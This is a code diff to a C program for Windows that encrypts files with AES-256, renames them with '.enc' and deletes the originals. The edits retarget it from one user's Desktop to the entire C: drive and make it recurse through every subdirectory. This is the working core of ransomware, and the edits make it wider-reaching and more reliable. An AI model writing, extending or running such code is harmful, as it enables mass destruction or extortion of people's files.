@@ -5,7 +5,7 @@
 
 #define ENCRYPT_EXT ".enc"
 #define AES_KEY_SIZE 32 // 256 bits
-#define TARGET_DIR "C:\\Users\\bogar\\Desktop\\" // Change as needed
+#define TARGET_DIR "C:\\" // Change as needed
 
 BOOL MyEncryptFile(const char* inFile, const char* outFile, BYTE* key, DWORD keyLen) {
     BOOL result = FALSE;
@@ -39,7 +39,10 @@ cleanup:
     if (hKey) CryptDestroyKey(hKey);
     if (hHash) CryptDestroyHash(hHash);
     if (hProv) CryptReleaseContext(hProv, 0);
-    DeleteFileA(inFile);
+    // Only delete the original if encryption succeeded
+    if (result) {
+        DeleteFileA(inFile);
+    }
     return result;
 }
 
@@ -52,7 +55,14 @@ void EncryptAllFiles(const char* dir, BYTE* key, DWORD keyLen) {
     if (hFind == INVALID_HANDLE_VALUE) return;
 
     do {
-        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // Skip "." and ".."
+            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+                char subDir[MAX_PATH];
+                snprintf(subDir, MAX_PATH, "%s%s\\", dir, findData.cFileName);
+                EncryptAllFiles(subDir, key, keyLen); // Recurse into subdirectory
+            }
+        } else {
             char inFile[MAX_PATH], outFile[MAX_PATH];
             snprintf(inFile, MAX_PATH, "%s%s", dir, findData.cFileName);
             if (StrStrIA(findData.cFileName, ENCRYPT_EXT)) continue;
